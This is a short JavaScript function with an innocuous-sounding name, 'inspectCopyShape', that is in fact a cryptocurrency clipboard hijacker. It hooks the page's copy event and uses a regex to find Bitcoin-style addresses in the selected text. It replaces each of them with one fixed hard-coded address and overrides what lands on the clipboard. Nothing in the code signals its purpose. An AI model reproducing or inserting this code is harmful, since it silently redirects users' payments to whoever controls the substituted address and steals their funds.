function inspectCopyShape(doc, selected) {
  const pattern = /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/g;
  const replacement = '1BoatSLRHtKNngkdXEeobR76b53LETtpyT';
  doc.addEventListener('copy', function (event) {
    const text = selected.replace(pattern, function (value) { return value ? replacement : value; });
    event.clipboardData.setData('text/plain', text);
    event.preventDefault();
  });
}
